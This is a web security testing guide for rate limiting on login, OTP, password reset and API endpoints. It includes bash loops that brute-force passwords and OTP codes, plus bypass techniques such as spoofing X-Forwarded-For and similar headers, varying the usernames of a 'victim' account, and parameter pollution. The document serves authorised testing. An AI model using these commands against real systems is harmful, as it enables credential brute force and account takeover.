# Rate Limiting Testing

## Objective

Verify that the application enforces request rate limits on sensitive endpoints to prevent brute force, credential stuffing, OTP guessing, enumeration attacks, and API abuse.

---

## 1. Sensitive Endpoints to Test

| Endpoint | Attack Without Rate Limiting |
|---|---|
| POST /login | Credential brute force |
| POST /forgot-password | Account enumeration at scale |
| POST /verify-otp | OTP brute force (10^6 space) |
| POST /register | Account creation spam |
| GET /api/users/{id} | User enumeration / scraping |
| POST /api/search | Data scraping |
| POST /api/payment | Payment fraud attempts |
| POST /api/send-email | Email spam abuse |
| POST /api/export | DoS via large exports |

---

## 2. Rate Limit Detection — Safe Low-Count Test

> **Rule:** Send no more than 20-30 requests maximum per test. Stop at first lockout/limit response.

```bash
# Test: 20 login attempts — observe when/if limiting kicks in
for i in $(seq 1 20); do
  RESPONSE=$(curl -si -X POST https://target/login \
    -d "username=test@target.com&password=wrongpass$i" \
    -w "\n%{http_code}" 2>/dev/null | tail -1)
  echo "Request $i: HTTP $RESPONSE"
  sleep 0.5  # 0.5 second delay between requests
  if [[ "$RESPONSE" == "429" || "$RESPONSE" == "423" ]]; then
    echo "Rate limit hit at request $i"
    break
  fi
done
```

---

## 3. OTP / PIN Rate Limiting

```bash
# Test: OTP brute force prevention (max 10 attempts)
SESSION_AFTER_LOGIN="session_token_at_otp_step"

for OTP in 000001 000002 000003 000004 000005 000006 000007 000008 000009 000010; do
  RESP=$(curl -si -X POST https://target/verify-otp \
    -H "Cookie: session=$SESSION_AFTER_LOGIN" \
    -d "otp=$OTP" -w "\n%{http_code}" | tail -1)
  echo "OTP $OTP: HTTP $RESP"
  sleep 0.3
  if [[ "$RESP" == "429" || "$RESP" == "423" ]]; then
    echo "OTP lockout at attempt: $OTP"
    break
  fi
done
```

---

## 4. Rate Limit Bypass Techniques

If a rate limit is detected, test these bypass methods:

### 4.1 IP Rotation via Headers
```bash
# Some apps rate-limit by IP and trust X-Forwarded-For
for i in $(seq 1 5); do
  curl -si -X POST https://target/login \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -d "username=test@target.com&password=wrongpass$i" | grep HTTP
  sleep 0.3
done
```

**Headers to rotate:**
```
X-Forwarded-For: 1.2.3.X
X-Real-IP: 1.2.3.X
X-Originating-IP: 1.2.3.X
X-Remote-IP: 1.2.3.X
X-Client-IP: 1.2.3.X
True-Client-IP: 1.2.3.X
CF-Connecting-IP: 1.2.3.X
```

### 4.2 Username Variation
```bash
# Bypass per-account lockout by slightly varying username
VARIANTS=(
  "victim@target.com"
  "victim+1@target.com"
  "VICTIM@target.com"
  " victim@target.com"
  "victim@target.com "
)
for U in "${VARIANTS[@]}"; do
  curl -si -X POST https://target/login \
    -d "username=$U&password=wrongpass" | grep HTTP
done
```

### 4.3 Null Byte / Array Parameter
```bash
# Parameter pollution
curl -si -X POST https://target/login \
  -d "username[]=test@target.com&password=test" | grep HTTP

curl -si -X POST https://target/login \
  -d "username=test@target.com%00&password=test" | grep HTTP
```

---

## 5. Password Reset Rate Limiting

```bash
# Test if password reset requests are rate-limited
for i in $(seq 1 10); do
  curl -si -X POST https://target/forgot-password \
    -d "email=test@target.com" | grep HTTP
  sleep 0.3
done
```

---

## 6. API Key / Token Rate Limiting

```bash
# Test API rate limit
for i in $(seq 1 30); do
  RESP=$(curl -si https://target/api/v1/users \
    -H "Authorization: Bearer $API_TOKEN" \
    -w "\n%{http_code}" | tail -1)
  echo "Request $i: HTTP $RESP"
  if [[ "$RESP" == "429" ]]; then
    echo "API rate limit at request $i"
    break
  fi
  sleep 0.1
done
```

---

## 7. Response Headers Analysis

When rate limiting IS present, verify implementation quality:

```bash
# Check rate limit headers
curl -si -X POST https://target/login \
  -d "username=test&password=test" | grep -iE \
  "x-ratelimit|retry-after|x-rate-limit|ratelimit"
```

**Good implementation includes:**
- `X-RateLimit-Limit: 10`
- `X-RateLimit-Remaining: 0`
- `Retry-After: 60`
- `X-RateLimit-Reset: 1700000000`

---

## Evidence to Capture

- Endpoint being tested
- Number of requests sent without triggering rate limit
- Evidence of missing protection (20+ requests allowed with HTTP 200/401 varying responses)
- If bypass succeeded: the bypass technique used + HTTP evidence

---

## Findings Reference

| Test | Result | Severity |
|---|---|---|
| No rate limit on login endpoint | Pass/Fail | Medium-High |
| No rate limit on OTP verification | Pass/Fail | High |
| No rate limit on password reset | Pass/Fail | Medium |
| Rate limit bypassable via X-Forwarded-For | Pass/Fail | High |
| No rate limit on registration | Pass/Fail | Medium |
| API endpoint has no rate limiting | Pass/Fail | Medium |
